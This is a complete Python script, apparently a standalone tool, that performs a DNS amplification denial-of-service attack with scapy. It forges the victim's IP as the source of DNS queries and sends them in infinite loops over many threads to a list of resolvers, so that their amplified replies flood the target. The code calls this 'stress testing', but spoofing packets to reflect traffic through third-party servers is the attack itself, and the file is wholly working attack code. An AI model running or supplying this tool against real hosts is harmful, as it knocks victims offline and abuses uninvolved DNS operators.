#!/usr/bin/python
# dnsamplification.py
# Version: 1.0
# License: Apache License Version 2.0
# Author: Georgii Starostin
# E-mail: blackdiverx@gmail.com
# Site: https://BlackDiver.net
from scapy.all import *
from multiprocessing import Pool as TPool
import time
import argparse

def readservers(DataFile):
	with open(DataFile) as ServersFile:
		AmplData = [row.strip() for row in ServersFile]
	return AmplData

def dnsquery(dns):
	param = dns.split()
	SPort = random.randint(1025, 65534)
	ip=IP(src=target,dst=param[0])/UDP(sport=SPort,dport=53)
	dnsrequest=DNS(rd=1,qd=DNSQR(qname=param[1],qtype=param[2]))
	p=ip/dnsrequest
	print "Start Thread (IP:",param[0],"Port:",SPort,"Query Type:",param[2]," Query:",param[1],")"
	send(p,inter=0,loop=1,verbose=0)

def main(dnsservers):
	print "Starting DNS Amplification stress testing"
	print "Timeout: ",timeout," sec"
	pool=TPool(threads)
	pool.map_async(dnsquery,dnsservers)
	timer = time.time()+timeout
	while True:
		if timeout != 0 and time.time() > timer:
			pool.terminate()
			pool.join()
			break

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument("-target", help="Target host")
	parser.add_argument("-servers", default="servers.txt", help="DNS servers list(Default: servers.txt. File format: IP DNS_query Query_type)")
	parser.add_argument("-timeout", type=int, default=10, help="Timeout querys. 0-Infinity (Default: 10sec)")
	parser.add_argument("-threads", type=int, default=10, help="Query threads (Default: 10)")
	args =  parser.parse_args()
	DNSFile = args.servers
	target = args.target
	timeout = args.timeout
	threads = args.threads

	if (len(sys.argv) < 2) or (target == None):
		print "Parameters missing"
		parser.print_help()
		sys.exit(0)

	try:

		main(readservers(DNSFile))
	except KeyboardInterrupt:
		print "Stoping stress testing and Exit"
	print "Stress testing ended"

